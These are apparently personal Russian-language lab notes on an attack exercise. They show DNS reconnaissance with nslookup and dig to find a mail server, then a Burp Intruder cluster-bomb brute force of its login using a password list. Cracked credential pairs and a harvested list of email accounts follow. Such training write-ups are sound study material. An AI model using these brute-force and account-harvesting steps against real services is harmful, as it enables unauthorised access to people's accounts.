---
attack: dns
---
     password
anna
dancer
qwerty
12345678
omgpop
peanut
alexander
summer
ricardo


```
r_andrews@edu.stf
t_mathis@edu.stf
s_dotson@edu.stf
```

 
 
//1 способ не снизу не совсем коректен... потому что 2 более правильный 
УЗнаем айпи адрес этого сервиса  почему я спрашивал у 240? так как у него есть 53  порт и 
```
nslookup mail.edu.stf 10.124.1.240

Server:         10.124.1.240
Address:        10.124.1.240#53

Name:   mail.edu.stf
Address: 10.124.1.203


ПОпробовав сделать эту на другой машине... то печаль...
nslookup mail.edu.stf 10.124.1.238 

;; communications error to 10.124.1.238#53: connection refused
;; communications error to 10.124.1.238#53: connection refused
;; communications error to 10.124.1.238#53: connection refused
;; no servers could be reached
```
Ах да... если вы думали что подключились.... то этого может не произойти... так как **именно** на этом сервисе будет **https**

2 способ
```
 dig @10.124.1.240 edu.stf MX 
; <<>> DiG 9.19.21-1-Debian <<>> @10.124.1.240 edu.stf MX
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5611
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: bc927840ec24cc790100000066d2c36b7d655ed7353a1ba8 (good)
;; QUESTION SECTION:
;edu.stf.                       IN      MX

;; ANSWER SECTION:
edu.stf.                604800  IN      MX      10 mail.edu.stf.

;; ADDITIONAL SECTION:
mail.edu.stf.           604800  IN      A       10.124.1.203

;; Query time: 4 msec
;; SERVER: 10.124.1.240#53(10.124.1.240) (UDP)
;; WHEN: Sat Aug 31 03:17:01 EDT 2024
;; MSG SIZE  rcvd: 101

```

https://10.124.1.203
!https a не http
Далее переходим в бюпр пакет в Intruder -> меням атаку на Cluster bomb указываем два параметра переборора и данные логинов и паролей 
![[фыва.png]] 

Смотрим результат и видим разные длину ответа = `username=s_dotson@edu%2estf&password=ricardo`
`r_andrews@edu%2estf&password=dancer`

После того как зайдете сами знаете что делать 


`s_dotson@edu.stf ricardo`
`r_andrews@edu.stf dancer`

Ralf Andrews

Gerard Rodriquez.


получаем  для будуйщего 
Administrator@edu.stf
r_andrews@edu.stf
t_mathis@edu.stf
s_dotson@edu.stf
d_heath@fpb.stf
d_day@fpb.stf
w_mcmillan@fpb.stf
s_moses@edu.stf
t_mathis@edu.stf
m_mcdowell@edu.stf
l_shepherd@edu.stf
l_blackburn@edu.stf
j_hebert@edu.stf
h_morgan@edu.stf
e_kelly@edu.stf
c_blair@edu.stf